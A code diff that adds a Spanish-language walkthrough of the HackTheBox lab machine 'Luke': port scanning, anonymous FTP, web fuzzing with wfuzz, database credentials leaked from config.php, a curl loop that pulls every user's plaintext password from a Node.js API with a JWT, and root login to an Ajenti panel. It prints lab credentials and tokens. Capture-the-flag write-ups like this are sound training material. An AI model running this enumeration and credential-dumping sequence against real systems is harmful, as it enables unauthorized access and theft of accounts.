@@ -70,6 +70,207 @@
         const markdownContent = `
 # Máquina "Luke" de HackTheBox
 
+Caracteristicas:
+
+- linux 
+- free bsd
+- ftp enumeration
+- information leakage
+- abusing nodejs application
+- api enumeration
+- abusing ajenti administration panel
+- External
+- FTP
+- PHP
+- Penetration Tester Level 1
+- Anonymous/Guest Access
+- A07:2021-Identification And Authentication Failures
+- NodeJS
+- Clear Text Credentials
+- A02:2021-Cryptographic Failures
+- Password Reuse
+- A05:2021-Security Misconfiguration
+- Misconfiguration
+
+Util en:
+
+- eWPT
+
+
+        IP 10.10.10.137
+
+<pre>
+<code>
+    PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.16.2
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Luke
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+</code>
+</pre>
+
+lanzamos whatweb
+
+- whatweb http://10.10.10.137
+ 
+- http://10.10.10.137 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], Email[contact@luke.io], HTML5, HTTPServer[FreeBSD][Apache/2.4.38 (FreeBSD) PHP/7.3.3], IP[10.10.10.137], JQuery, PHP[7.3.3], Script, Title[Luke] 
+
+- whatweb http://10.10.10.137:3000
+
+- http://10.10.10.137:3000 [200 OK] Country[RESERVED][ZZ], IP[10.10.10.137], X-Powered-By[Express]
+ 
+- whatweb http://10.10.10.137:8000
+ 
+- http://10.10.10.137:8000 [200 OK] Cookies[session], Country[RESERVED][ZZ], HTML5, HttpOnly[session], IP[10.10.10.137], PasswordField[password], Script, Title[Ajenti], UncommonHeaders[x-auth-status]
+
+vemos el puerto 21 ftp asi que tratamos de conectarnos con usuario anonymous y podemos ingresar sin contraseña
+lanzamos
+
+- ftp 10.10.10.137
+
+- ls -a 
+
+se puede ver webapp
+
+- cd webapp
+
+y se ve un archivo for_Chihiro.txt
+
+- get for_Chihiro.txt
+
+podemos ver un mensaje dentro
+
+vamos a la pagina web y podemos ver 2 versiones desactualisadas de jquery, que son jquery 1.11.3 y jquery ui 1.9.2 propensas a un xss y a un prototype polution
+en la web con el puerto 3000 vemos un mensaje que dice (auth token is not supplied), con una web representada en json que hemos visto algunas parecidas haciendo 
+un authorization bearer con un hash.
+
+en el puerto 8000 a tardado demasiado en responder con credenciales comunes, asi que no vendria bien un ataque automatizado vemos la web normal y lanzamos ctrl + u 
+para ver el codigo fuente y no vemos nada interesante asi que prosigue fuzear con wfuzz y como la web trabaja con php podriamos intentar fuzzear con extenciones .php 
+tambien asi que lanzamos.
+
+- sudo wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.137/FUZZ 2>/dev/null
+
+que -c es con colores y solo vemos 404 asi que agregamos un --hc=404 y ahora vemos
+
+<pre>
+<code>
+000000268:   301        7 L      20 W       235 Ch      "member"       
+000000441:   401        12 L     46 W       381 Ch      "management"   
+000000550:   301        7 L      20 W       232 Ch      "css"          
+000000953:   301        7 L      20 W       231 Ch      "js"           
+000001481:   301        7 L      20 W       235 Ch      "vendor"       
+000003295:   200        21 L     172 W      1093 Ch     "LICENSE"      
+000045240:   200        108 L    240 W      205 Ch     "monarch"
+</code>
+</pre>
+
+vamos a 10.10.10.137/monarch, vemos un login asi que probamos con credenciales comunes. y nada ahora vamos a member y vemos una pagina que nos muestra parent directory 
+a vendor etc y bueno recordaremos el management asi que ahora lanzamos el funzzing pero con extencion php
+
+- sudo wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.137/FUZZ.php 2>/dev/null
+
+vemos un login.php y un config.php vemos los 2 y vamos a config.php damos ctrl + u y vemos credenciales
+
+$dbHost = 'localhost';
+$dbUsername = 'root';
+$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
+$db = "login";
+
+probamos en el panel login en el puerto 8000 agenti y nada no funciono en ningun panel de autenticcion. ahora vamos a fuzear el puerto 3000
+ahora obtenemos
+
+<pre>
+<code>
+000000002:   200        0 L      5 W        56 Ch       "#"            
+000000004:   200        0 L      5 W        56 Ch       "#"            
+000000053:   200        0 L      2 W        13 Ch       "login"        
+000000202:   200        0 L      5 W        56 Ch       "users"        
+000000825:   200        0 L      2 W        13 Ch       "Login"        
+000003701:   200        0 L      5 W        56 Ch       "Users"        
+000045240:   200        0 L      5 W        56 Ch       "http://10.10.10.137:3000/"   
+000101629:   200        0 L      2 W        13 Ch       "LogIn"        
+000148853:   200        0 L      2 W        13 Ch       "LOGIN
+</code>
+</pre>
+
+vamos al login pero vemos un panel vacio, asi que probablemente debamos pasarlo por post, asi que con curl haremos lo siguiente y como va a ser json para que 
+interprete bien hay que jugar con los headers.
+
+- curl -s -X POST "http://10.10.10.137:3000/login" -H "Content-Type: application/jon"  -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}'
+
+nois devuelve
+
+{"success":true,"message":"Authentication successful!",
+
+"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo"}
+
+vemos un token que podemos pasar para ver cosas de la siguiente manera
+
+- curl -s -X get "http://10.10.10.137:3000/lusers" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo" 
+
+y nos devuelve 
+[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
+
+y vemos 4 datos que podemos explotar de la siguiente forma 
+
+- curl -s -X get "http://10.10.10.137:3000/users/Admin" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo" 
+
+y nos devuelve
+
+{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
+
+tenemos la contraseña del usuario indicado rescatamos la de los otro
+
+- for user in Admin Derry Yuri Dory; do curl -s -X GET "http://10.10.10.137:3000/users/$user" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY0NjE4MDA5LCJleHAiOjE2NjQ3MDQ0MDl9.3yhWHN5TtFtrJse4qSMOsTOWPMpicAsHjsmcc3rCNBo" ; done
+
+y nos devuelve 
+
+- {"name":"Admin","password":"WX5b7)>/rp$U)FW"}{"name":"Derry","password":"rZ86wwLvx7jUxtch"}{"name":"Yuri","password":"bet@tester87"}{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+
+tenemos 4 paneles con lo que intentar y en 10.10.10.137/management
+
+- {"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+
+(revisar fuzeo de maquinas con apis backend backend 2) y vamos al config json y vemos varias cosas turbias
+
+- http://10.10.10.137/management/config.json
+
+<img src="imagenes/luke/turbio.png" alt="Texto alternativo" width="500">
+
+probaremos en el agenti root y la contraseña KpMasng6S5EtTy9Z y estamos dentro buscamos la flag.
+
+Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
+debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
+y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
+o cualquier error, Puedes contactarme a mi correo.
+
+lerioxirit@proton.me
+
 
         `;
         
